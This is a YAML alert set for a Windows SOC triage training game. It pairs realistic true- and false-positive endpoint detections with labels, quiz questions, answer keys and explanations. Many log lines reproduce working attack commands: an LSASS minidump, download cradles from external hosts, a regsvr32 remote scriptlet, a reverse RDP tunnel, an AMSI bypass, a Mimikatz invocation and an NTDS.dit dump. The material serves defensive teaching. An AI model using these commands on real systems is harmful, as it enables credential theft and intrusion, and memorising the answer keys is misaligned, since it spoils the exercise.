@@ -1,0 +1,616 @@
+# ON SHIFT alerts — part 1: Windows endpoint
+# v: 1 = true positive (escalate), 0 = false positive (close)
+- id: e01
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: rundll32 comsvcs.dll execution
+  h: WS-ACCT-0318 · rturner
+  l: ['parent: cmd.exe', 'cmd: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 724 C:\Users\Public\l.dmp full']
+  v: 1
+  x: T1003.001
+  c: comsvcs-minidump-lsass
+  k: [1]
+  diff: 2
+  say: A rundll32 command calls the comsvcs dll MiniDump function against a process ID, writing a dump to a public folder.
+  q:
+    kind: pivot
+    ask: First pivot?
+    o: [Pull the process tree and LSASS access on the host, Reset the user and move on, Block the public IP at the firewall]
+    a: 0
+    why: Scope the host and confirm the dump before chasing creds.
+  tell: comsvcs.dll + MiniDump against a PID in the LSASS range = credential dumping with a built-in Windows DLL. No malware needed, just vibes and your passwords.
+- id: e02
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: PowerShell execution policy bypass
+  h: SRV-FILE-02 · SYSTEM
+  l: ['parent: CcmExec.exe', 'cmd: powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\a1f3.ps1']
+  v: 0
+  x: T1059.001
+  c: powershell-bypass-parent
+  k: [0]
+  diff: 2
+  trap: scary
+  say: PowerShell launched with an execution policy bypass to run a script, and its parent process is the systems management agent.
+  q:
+    kind: tune
+    ask: Best tuning?
+    o: [Suppress all -ExecutionPolicy Bypass org-wide, Exclude the whole file server, Exclude parent CcmExec.exe plus the CCM SystemTemp path]
+    a: 2
+    why: Scope to the agent and its path; a blanket bypass exclusion blinds real abuse.
+  tell: Parent is CcmExec.exe, the SCCM agent. It runs bypass scripts out of CCM\SystemTemp all day. Check the parent before you summon IR.
+- id: e03
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: 'Sysmon process create: certutil'
+  h: WS-HR-0177 · mfarah
+  l: ['parent: WINWORD.EXE', 'cmd: certutil.exe -urlcache -split -f http://45.61.x.x/a.txt C:\ProgramData\a.exe']
+  v: 1
+  x: T1105
+  c: office-child-process
+  k: [0, 1]
+  diff: 2
+  say: Word spawned a command that downloads a text file from a raw address and saves it as an executable in program data.
+  tell: 'Two red flags stacked: Word spawning a child, and certutil downloading anything. A .txt saved as .exe is the cherry on top.'
+- id: e04
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: Scheduled task created by script host
+  h: WS-SALES-0612 · dkline
+  l: ['parent: wscript.exe', 'cmd: schtasks /create /tn "OneDriveUpdate" /tr "C:\Users\dkline\AppData\Roaming\upd.exe" /sc onlogon']
+  v: 1
+  x: T1053.005
+  c: scheduled-task-fake-name
+  k: [1]
+  diff: 2
+  trap: bland
+  say: A script host created a logon scheduled task named OneDrive Update that runs a binary from the user's roaming app data folder.
+  tell: Fake name, real persistence. Real OneDrive tasks are not created by wscript and do not run binaries out of AppData\Roaming at logon.
+- id: e05
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Encoded PowerShell command
+  h: WS-ENG-0192 · pnguyen
+  l: ['parent: explorer.exe', 'cmd: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...', 'decoded: IEX (New-Object Net.WebClient).DownloadString(''http://cdn-upd[.]top/s'')']
+  v: 1
+  x: T1059.001
+  c: encoded-ps-decode
+  k: [2]
+  diff: 2
+  say: Explorer launched hidden PowerShell with no profile and an encoded command that decodes to a web client download string.
+  tell: -nop -w hidden -enc decoding to IEX + DownloadString is the classic download cradle. Hidden window, no profile, remote code straight into memory.
+- id: e06
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Encoded PowerShell command
+  h: SRV-SQL-07 · svc_monitor
+  l: ['parent: HealthService.exe', 'cmd: powershell.exe -NoProfile -EncodedCommand JABlAHIAcgBvAHIAQQBjAHQAaQBvAG4A...', 'decoded: $errorActionPreference=''Stop''; Get-Counter ''\Processor(_Total)\% Processor Time''']
+  v: 0
+  x: T1059.001
+  c: encoded-ps-decode
+  k: [2]
+  diff: 2
+  trap: scary
+  say: The monitoring agent launched PowerShell with an encoded command that decodes to a request for processor performance counters.
+  tell: Encoded does not mean evil. HealthService.exe is the SCOM/Azure Monitor agent and the decoded body just reads perf counters. Always decode before you escalate.
+- id: e07
+  d: endpoint
+  src: Windows Security · 4698
+  t: Scheduled task created
+  h: WS-FIN-0356 · SYSTEM
+  l: ['task: \Microsoft\Windows\UpdateOrchestrator\Schedule Scan', 'action: %systemroot%\system32\usoclient.exe StartScan', 'author: Microsoft Corporation']
+  v: 0
+  x: T1053.005
+  c: scheduled-task-fake-name
+  k: [1]
+  diff: 2
+  trap: scary
+  say: A scheduled task under the update orchestrator path runs the update client from system thirty-two, authored by Microsoft.
+  tell: UpdateOrchestrator + usoclient.exe from system32 is Windows Update doing Windows Update things. Location and path match the real thing.
+- id: e08
+  d: endpoint
+  src: Sysmon · Event ID 10
+  t: LSASS handle opened
+  h: WS-IT-0033 · admin_kp
+  l: ['source: C:\Users\admin_kp\Downloads\pd64.exe', 'target: C:\Windows\System32\lsass.exe', 'granted access: 0x1fffff', 'signer: Sysinternals (Microsoft)']
+  v: 1
+  x: T1003.001
+  c: lsass-access
+  k: [0]
+  diff: 2
+  say: A tool in the downloads folder opened the local security authority process with full access; its signer is Microsoft Sysinternals.
+  tell: Signed by Microsoft does not mean safe. That is ProcDump renamed to pd64.exe in Downloads, with full access (0x1fffff) on LSASS. Signed tools, unsigned intentions.
+- id: e09
+  d: endpoint
+  src: Sysmon · Event ID 10
+  t: LSASS handle opened
+  h: WS-MKT-0588 · SYSTEM
+  l: ['source: C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe', 'target: C:\Windows\System32\lsass.exe', 'granted access: 0x1000']
+  v: 0
+  x: T1003.001
+  c: lsass-access
+  k: [0]
+  diff: 2
+  trap: scary
+  say: The endpoint sensor opened the local security authority process from its own install folder with a limited query access right.
+  q:
+    kind: tune
+    ask: Best tuning?
+    o: [Stop all LSASS-access alerts, Allowlist the EDR image path for LSASS access, Allowlist by access mask only]
+    a: 1
+    why: Trust the signed sensor image, not a mask attackers can copy.
+  tell: 'Your own EDR touches LSASS all day. The tell is the signed sensor image from its own install path, not the access mask: attackers copy innocent-looking masks too.'
+- id: e10
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: vssadmin and wbadmin execution
+  h: SRV-APP-22 · SYSTEM
+  l: ['parent: cmd.exe (parent: svch0st.exe)', 'cmd: vssadmin.exe delete shadows /all /quiet', 'followed by: wbadmin delete catalog -quiet']
+  v: 1
+  x: T1490
+  c: shadow-copy-deletion
+  k: [1]
+  diff: 1
+  say: A command deleted all shadow copies quietly and then deleted the backup catalog, parented through a misspelled service host.
+  q:
+    kind: contain
+    ask: First action?
+    o: [Isolate the host now, Restore from backup, Open a ticket for morning]
+    a: 0
+    why: Backups are being destroyed; isolate before encryption.
+  tell: 'Deleting all shadow copies AND the backup catalog = ransomware clearing the escape hatches. Also: svch0st with a zero. Escalate yesterday.'
+- id: e11
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Defender exclusion added
+  h: WS-DEV-0260 · jvasquez
+  l: ['parent: powershell.exe (parent: winword.exe)', 'cmd: Add-MpPreference -ExclusionPath C:\Users\Public\', user is not a local admin... until 2 min ago]
+  v: 1
+  x: T1685
+  c: disable-security-control
+  k: [2]
+  diff: 3
+  say: A Word-spawned PowerShell added a Defender exclusion for a public folder, and the user became a local admin two minutes earlier.
+  tell: Excluding C:\Users\Public from Defender, from a Word-spawned PowerShell, right after a privilege change. Someone is clearing a spot to drop a payload.
+- id: e12
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Defender exclusion added
+  h: SRV-BUILD-09 · svc_build01
+  l: ['parent: java.exe (Jenkins build agent)', 'cmd: Add-MpPreference -ExclusionPath D:\jenkins\workspace\', 'change ticket: CHG0041872 (approved)']
+  v: 0
+  x: T1685
+  c: disable-security-control
+  k: [2]
+  diff: 2
+  trap: scary
+  say: A build agent added a Defender exclusion for its workspace folder, with an approved change ticket referenced.
+  q:
+    kind: tune
+    ask: Best tuning?
+    o: [Allow all Defender exclusions from service accounts, Scope the exclusion to the build account and workspace path, Disable exclusion alerts]
+    a: 1
+    why: Tie it to the account and path in the change, nothing broader.
+  tell: Build servers exclude their workspace so Defender stops eating compile speed. Service account, build-agent parent, approved change ticket. Annoying, not evil.
+- id: e13
+  d: endpoint
+  src: Defender for Endpoint · DeviceRegistryEvents
+  t: Run key persistence
+  h: WS-OPS-0055 · mfarah
+  l: ['key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run', 'value: Spotify', 'data: "C:\Users\mfarah\AppData\Roaming\Spotify\Spotify.exe" /minimized', 'signer: Spotify AB']
+  v: 0
+  x: T1547.001
+  c: run-key-persistence
+  k: [3]
+  diff: 2
+  trap: scary
+  say: A run key named Spotify points to the Spotify app in roaming app data, starting minimized, signed by Spotify.
+  tell: Run keys are where every app with an ego lives. Spotify, signed, in its own folder, with /minimized. That is a music addiction, not an intrusion.
+- id: e14
+  d: endpoint
+  src: Defender for Endpoint · DeviceRegistryEvents
+  t: Run key persistence
+  h: WS-LEG-0019 · rpatel
+  l: ['key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run', 'value: WindowsSecurityHealth', 'data: "C:\Users\rpatel\AppData\Local\Temp\wsh.vbs"', 'signer: none (script)']
+  v: 1
+  x: T1547.001
+  c: run-key-persistence
+  k: [2]
+  diff: 2
+  say: A run key named Windows Security Health points to a script in the temp folder, with no signer.
+  tell: The real SecurityHealth entry lives in HKLM and points to System32. A VBS out of Temp wearing a Windows costume is persistence cosplay.
+- id: e15
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: Discovery burst
+  h: WS-FIN-0477 · hlarsen
+  l: ['within 40 seconds:', whoami /all → net group "Domain Admins" /domain → nltest /domain_trusts → net view /all]
+  v: 1
+  x: T1087.002
+  c: discovery-burst
+  k: [1]
+  diff: 2
+  say: In forty seconds the host ran who-am-i, domain admins group, domain trusts, and net view, back to back.
+  tell: One discovery command is an admin. Four in 40 seconds, ending with domain trusts, is someone reading the map before they move.
+- id: e16
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: Discovery burst
+  h: WS-IT-0045 · jvasquez
+  l: ['parent: mmc.exe → cmd.exe', 'cmd: ipconfig /all → ping dc01 → nslookup dc01 → gpupdate /force', 'ticket: INC0098341 "user cannot get GPO"']
+  v: 0
+  x: T1016
+  c: discovery-burst
+  k: [2]
+  diff: 2
+  trap: scary
+  say: Through the management console a session ran ip config, ping, name lookup, and group policy update, with a matching help desk ticket.
+  tell: Network troubleshooting looks like recon to a robot. ipconfig, ping, nslookup, gpupdate, with a matching helpdesk ticket = jvasquez is chasing a GPO problem.
+- id: e17
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Remote service creation
+  h: SRV-DC-04 · CORP\swhite
+  l: ['source host: WS-ACCT-0421', 'service: BTOBTO', 'binary: %COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat']
+  v: 1
+  x: T1569.002
+  c: impacket-remote-exec
+  k: [2]
+  diff: 3
+  say: A workstation remotely created a service on a domain controller whose binary echoes output to a local admin share path.
+  tell: That output-to-\\127.0.0.1\C$\__output pattern is Impacket smbexec. An accounting workstation creating services on a DC is lateral movement in a trench coat.
+- id: e18
+  d: endpoint
+  src: Windows System · 7045
+  t: New service installed
+  h: WS-PM-0301 · SYSTEM
+  l: ['service: Zoom Sharing Service', 'path: "C:\Program Files\Common Files\Zoom\Support\CptService.exe"', 'signer: Zoom Video Communications, Inc.']
+  v: 0
+  x: T1543.003
+  c: new-service-signer
+  k: [2]
+  diff: 1
+  trap: scary
+  say: A new service named Zoom Sharing Service runs a Zoom binary from common files, signed by Zoom.
+  tell: Signed vendor binary in Program Files with a boring name. New services happen every Patch Tuesday. Path + signer is the 5-second check.
+- id: e19
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Mshta remote script
+  h: WS-REC-0030 · bokoro
+  l: ['parent: explorer.exe', 'cmd: mshta.exe http://invoice-docs[.]online/v.hta']
+  v: 1
+  x: T1218.005
+  c: lolbin-remote-script
+  k: [1]
+  diff: 1
+  say: Explorer launched the HTML application host to pull an application from an invoice-themed internet domain.
+  tell: mshta pulling an .hta from a random domain = someone clicked. Nobody legit runs HTAs from the internet in 2026.
+- id: e20
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: regsvr32 execution
+  h: WS-ENG-0144 · bwalsh
+  l: ['cmd: regsvr32.exe /s /n /u /i:http://203.0.113.50/x.sct scrobj.dll', 'signer: Microsoft Windows (valid signature)']
+  v: 1
+  x: T1218.010
+  c: lolbin-remote-script
+  k: [0]
+  diff: 2
+  say: Regsvr32 ran silently with an install switch pointing to a remote scriptlet over the web using the script object library.
+  tell: regsvr32 + /i:http + scrobj.dll is "Squiblydoo". It runs remote scriptlets through a signed binary. Textbook since 2016 and it still works.
+- id: e21
+  d: endpoint
+  src: Defender for Endpoint · DeviceFileEvents
+  t: Mass file rename
+  h: SRV-FS-03 · CORP\svc_backup
+  l: ['1,842 files renamed in 90 sec', 'extension: .docx → .docx.6h1k9', 'new file in each folder: readme_restore.txt']
+  v: 1
+  x: T1486
+  c: mass-file-rename
+  k: [1]
+  diff: 1
+  say: Nearly two thousand files were renamed in ninety seconds, each getting a new extension, with a restore note left in every folder.
+  q:
+    kind: contain
+    ask: First action?
+    o: [Isolate the file server immediately, Start restoring files, Email the owner]
+    a: 0
+    why: Encryption is live; isolation stops the spread.
+  tell: New random extension on every file + a readme in every folder = encryption in progress. Isolate first, ask questions while it is isolated.
+- id: e22
+  d: endpoint
+  src: Defender for Endpoint · DeviceFileEvents
+  t: Mass file rename
+  h: WS-DES-0019 · cdiaz
+  l: ['3,100 files renamed in 2 min', 'process: Adobe Lightroom Classic.exe', 'pattern: IMG_####.CR3 → 2026-11-02_Shoot_####.CR3']
+  v: 0
+  x: T1486
+  c: mass-file-rename
+  k: [1]
+  diff: 1
+  trap: scary
+  say: Three thousand files were renamed in two minutes by Lightroom, from image numbers into a dated shoot naming pattern.
+  q:
+    kind: tune
+    ask: Best tuning?
+    o: [Stop all mass-rename alerts, Exclude the whole design team, Exclude Lightroom bulk renames with a date pattern]
+    a: 2
+    why: Scope to the app and its rename pattern.
+  tell: Bulk rename by Lightroom with a date pattern is a photographer batch-renaming a shoot. Ransomware does not care about your naming conventions.
+- id: e23
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: Remote Desktop tunneling
+  h: WS-ENG-0341 · tmalley
+  l: ['cmd: C:\ProgramData\svc\plink.exe -ssh -R 0.0.0.0:4455:127.0.0.1:3389 root@198.51.100.7 -pw ********', 'parent: cmd.exe']
+  v: 1
+  x: T1572
+  c: covert-tunnel-egress
+  k: [0]
+  diff: 2
+  say: A link utility opened a reverse-forwarded tunnel from the local remote desktop port out to an external address over SSH.
+  tell: plink reverse-forwarding local RDP to an outside box. Somebody wants a GUI on this host from the internet.
+- id: e24
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Remote access tool executed
+  h: WS-FIN-0222 · kdavis
+  l: ['process: AnyDesk.exe from C:\Users\kdavis\Downloads', 'first seen in org: today', 'preceded by: 14 min phone call with "Microsoft Support"']
+  v: 1
+  x: T1219
+  c: rmm-sanctioned-vs-rogue
+  k: [1, 2]
+  diff: 3
+  say: An unknown remote access tool ran from downloads, first seen today, right after a fourteen minute call from Microsoft Support.
+  q:
+    kind: contain
+    ask: First action?
+    o: [Isolate the host and kill the RMM session, Ask the user to hang up, Block the AnyDesk domain only]
+    a: 0
+    why: A live attacker has remote control; cut it now.
+  tell: Unsanctioned RMM + first seen today + a phone call from "Microsoft" = tech support scam or a callback-phishing crew. RMM tools are the new malware.
+- id: e25
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Remote access tool executed
+  h: WS-IT-0211 · rkhan
+  l: ['process: ScreenConnect.ClientService.exe', 'path: C:\Program Files (x86)\ScreenConnect Client (a1b2c3)\', 'instance ID matches: corp IT tenant', 'deployed by: Intune']
+  v: 0
+  x: T1219
+  c: rmm-sanctioned-vs-rogue
+  k: [2]
+  diff: 2
+  trap: scary
+  say: A screen sharing client ran from program files, its instance identifier matching the corporate IT tenant, deployed by Intune.
+  q:
+    kind: tune
+    ask: Best tuning?
+    o: [Allowlist all ScreenConnect binaries, Allowlist the sanctioned ScreenConnect instance ID, Allowlist the host]
+    a: 1
+    why: Trust your own tenant instance, not every ScreenConnect.
+  tell: Same tool category, different story. Deployed by Intune, instance ID matches your own IT tenant. Know your sanctioned RMMs and their instance IDs.
+- id: e26
+  d: endpoint
+  src: Windows Security · 1102
+  t: Security log cleared
+  h: SRV-DC-03 · CORP\rblum (accounting)
+  l: ['event: The audit log was cleared', 'subject: CORP\jmiller (accounting)', 'time: 03:17 local']
+  v: 1
+  x: T1685.005
+  c: log-clearing
+  k: [1, 2]
+  diff: 2
+  say: The domain controller security audit log was cleared at three seventeen in the morning by an account from the accounting team.
+  tell: An accountant clearing the DC security log at 3am. There is no world where that is fine.
+- id: e27
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Ntdsutil execution
+  h: SRV-DC-05 · CORP\da_mwilson
+  l: ['cmd: ntdsutil "ac i ntds" "ifm" "create full c:\temp\x" q q', 'time: 02:41', 'da_mwilson last interactive logon: 9 months ago']
+  v: 1
+  x: T1003.003
+  c: ntdsutil-ifm-dump
+  k: [0]
+  diff: 2
+  say: An install-from-media command dumped the directory database at two forty-one, using a domain admin dormant for nine months.
+  q:
+    kind: pivot
+    ask: First pivot?
+    o: [Reset every user password, Reboot the DC, Check the IFM output path and the dormant admin activity]
+    a: 2
+    why: Confirm the dump and scope the dormant admin.
+  tell: IFM creation dumps NTDS.dit, the whole domain's hashes. Using a dormant Domain Admin at 2am. That is the crown jewels walking out.
+- id: e28
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: WMI remote process creation
+  h: SRV-WEB-04 · CORP\svc_mgmt
+  l: ['parent: WmiPrvSE.exe', 'cmd: C:\Windows\CCM\ccmsetup.exe /mp:sccm01.corp.local SMSSITECODE=CRP', 'source: sccm01.corp.local']
+  v: 0
+  x: T1047
+  c: impacket-remote-exec
+  k: [1]
+  diff: 2
+  trap: scary
+  say: A WMI process spawned the configuration manager setup pointing at the corporate site server with the corporate site code.
+  tell: WmiPrvSE spawning ccmsetup with your own site code from your own SCCM server is client push. WMI lateral is only scary when the parent story does not make sense.
+- id: e29
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: WMI remote process creation
+  h: SRV-HR-02 · CORP\kfisher
+  l: ['parent: WmiPrvSE.exe', 'cmd: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1730962811.42 2>&1', 'source: WS-SALES-0744']
+  v: 1
+  x: T1047
+  c: impacket-remote-exec
+  k: [1]
+  diff: 2
+  say: A WMI process ran a command whose output goes to a local admin share with a timestamp name, sourced from a workstation.
+  tell: cmd /Q /c ... 1> \\127.0.0.1\ADMIN$\__<timestamp> is Impacket wmiexec’s fingerprint. A workstation driving commands on a server it has no business on. Lateral movement.
+- id: e30
+  d: endpoint
+  src: Defender for Endpoint · DeviceImageLoadEvents
+  t: Unsigned DLL sideload
+  h: WS-ENG-0201 · ykim
+  l: ['process: C:\Users\Public\Music\OneDriveStandaloneUpdater.exe (signed Microsoft)', 'loaded: version.dll (unsigned) from same folder']
+  v: 1
+  x: T1574.001
+  c: dll-sideload-signer
+  k: [1]
+  diff: 2
+  say: A signed Microsoft updater copied into a public music folder loaded an unsigned version dll sitting beside it.
+  tell: Signed Microsoft EXE copied to Public\Music, loading an unsigned version.dll next to it = DLL sideloading. The legit binary is the getaway car.
+- id: e31
+  d: endpoint
+  src: Defender for Endpoint · DeviceEvents
+  t: PowerShell script block content
+  h: WS-SALES-0870 · ewong
+  l: ['script content: [Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)', 'ActionType: PowerShellCommand']
+  v: 1
+  x: T1685
+  c: disable-security-control
+  k: [0]
+  diff: 2
+  say: A script reflectively set the anti-malware scan interface initialization-failed flag to true for the session.
+  tell: Flipping amsiInitFailed to true blinds AMSI for the session. Zero legit software does this. It is the attacker turning off the lights before the main event.
+- id: e32
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Browser credential access
+  h: WS-MKT-0233 · mjain
+  l: ['process: C:\Users\mjain\AppData\Local\Temp\7zS1A2.tmp\setup.exe', 'read: ...\Google\Chrome\User Data\Default\Login Data', 'read: ...\Microsoft\Edge\User Data\Default\Cookies', 'outbound: 91.92.x.x:443 (12 MB)']
+  v: 1
+  x: T1555.003
+  c: browser-cred-theft
+  k: [0, 3]
+  diff: 2
+  say: A setup file in temp read the Chrome login data and Edge cookies, then sent twelve megabytes to an external address.
+  q:
+    kind: contain
+    ask: First action?
+    o: ['Revoke the user sessions and cookies, then reset', Reset the password only, Clear the browser cache]
+    a: 0
+    why: Stolen cookies bypass MFA; kill sessions, not just passwords.
+  tell: Random setup.exe reading browser Login Data AND Cookies, then 12 MB out. That is an infostealer, and those cookies mean MFA is already bypassed. Revoke sessions, not just passwords.
+- id: e33
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Browser credential access
+  h: WS-IT-0073 · lhecht
+  l: ['process: C:\Program Files\1Password\app\8\1Password.exe', 'read: ...\Google\Chrome\User Data\Default\Login Data', 'user action: "Import from Chrome" clicked']
+  v: 0
+  x: T1555.003
+  c: browser-cred-theft
+  k: [2]
+  diff: 2
+  trap: scary
+  say: The signed password manager read Chrome's saved login data right after the user clicked import from Chrome.
+  q:
+    kind: tune
+    ask: Best tuning?
+    o: [Stop all browser-credential alerts, Allowlist the user, Allowlist the signed password manager during a user-driven import]
+    a: 2
+    why: Trust the signed app and user action, not the behavior blindly.
+  tell: Password managers import from browsers, which looks identical to a stealer at the file level. Signed vendor app + a user-driven import = fine.
+- id: e34
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: Kerberoasting tool pattern
+  h: WS-DEV-0401 · afox
+  l: ['cmd: C:\Users\afox\Desktop\Rubeus.exe kerberoast /outfile:h.txt', 'followed by: 47 TGS requests (RC4) in 6 sec']
+  v: 1
+  x: T1558.003
+  c: kerberoast-source
+  k: [0]
+  diff: 2
+  say: Rubeus ran a kerberoast command to an output file, followed by forty-seven service ticket requests in six seconds.
+  tell: Rubeus kerberoast, then a burst of RC4 service tickets. They are grabbing service account hashes to crack offline. Find the weak SPN passwords before they do.
+- id: e35
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Kerberoasting tool pattern
+  h: WS-SEC-0012 · dneal
+  l: ['cmd: Rubeus.exe kerberoast /outfile:h.txt', 'account: dneal (temp account, engagement ENG-2611 red team)', 'window: inside approved RoE, 09:00-17:00']
+  v: 0
+  x: T1558.003
+  c: kerberoast-source
+  k: [1]
+  diff: 2
+  trap: scary
+  say: Rubeus ran a kerberoast command under a temporary account tied to an engagement, inside the approved rules and hours.
+  tell: 'Same exact behavior as a real kerberoast, but it is your pentester, inside scope and hours. Context is the whole job. Still: confirm with the engagement lead.'
+- id: e36
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Suspicious child of web server
+  h: SRV-WEB-05 · IIS APPPOOL\Portal
+  l: ['parent: w3wp.exe', 'cmd: cmd.exe /c whoami & ipconfig & net user']
+  v: 1
+  x: T1505.003
+  c: webshell-activity
+  k: [1]
+  diff: 1
+  say: The IIS worker process spawned a command running who-am-i, ip config, and net user.
+  tell: IIS worker spawning cmd with whoami is a webshell saying hello. Web servers serve pages; they do not ask who they are.
+- id: e37
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Suspicious child of web server
+  h: SRV-WEB-02 · IIS APPPOOL\Reports
+  l: ['parent: w3wp.exe', 'cmd: "C:\Program Files\wkhtmltopdf\bin\wkhtmltopdf.exe" --quiet https://reports.corp.local/r/4471 C:\Temp\r4471.pdf']
+  v: 0
+  x: T1505.003
+  c: webshell-activity
+  k: [1]
+  diff: 2
+  trap: scary
+  say: The IIS worker process launched a PDF generator from its known install path to render an internal report URL to a file.
+  tell: Some web apps legitimately shell out, like report-to-PDF generators. Known install path, internal URL, consistent pattern. Baseline your w3wp children.
+- id: e38
+  d: endpoint
+  src: Windows PowerShell · 4104
+  t: 'PowerShell 4104: script block logged'
+  h: SRV-APP-09 · CORP\svc_sql
+  l: ['script block: Invoke-Mimikatz -Command ''"sekurlsa::logonpasswords"''', 'loaded from: memory (no file)']
+  v: 1
+  x: T1003.001
+  c: mimikatz-present
+  k: [0]
+  diff: 2
+  say: Script block logging captured an invoke-Mimikatz logon-passwords command loaded from memory under a service account.
+  tell: Script block logging caught it even though it never hit disk. Invoke-Mimikatz on a server under a service account = someone already owns svc_sql.
+- id: e39
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Bitsadmin download
+  h: WS-ENG-0233 · gpowell
+  l: ['cmd: bitsadmin /transfer job /download /priority high http://193.x.x.x/p.ps1 C:\Users\Public\p.ps1', 'parent: cmd.exe']
+  v: 1
+  x: T1197
+  c: bits-download
+  k: [0]
+  diff: 1
+  trap: bland
+  say: Bits-admin started a high priority transfer downloading a PowerShell script from a raw address into a public folder.
+  tell: BITS jobs survive reboots and blend with Windows Update traffic. Downloading a .ps1 from a raw IP into Public is not an update.
+- id: e40
+  d: endpoint
+  src: Defender for Endpoint · AlertEvidence
+  t: Password spray from host
+  h: WS-REC-0051 · cwells
+  l: [4625 failures against 212 different accounts in 10 min, 'password pattern: same for all (Autumn2026!)', 'source process: powershell.exe']
+  v: 1
+  x: T1110.003
+  c: password-spray-brute
+  k: [1]
+  diff: 1
+  say: In ten minutes one host failed sign-ins against two hundred accounts using the same password, launched from PowerShell.
+  q:
+    kind: contain
+    ask: First action?
+    o: [Isolate the host launching the spray, Reset the two hundred accounts, Block the office subnet]
+    a: 0
+    why: The source is compromised and attacking; isolate it.
+  tell: Many accounts, one password, short window = password spray. From the front desk PC via PowerShell means it is already compromised and being used as a launchpad.
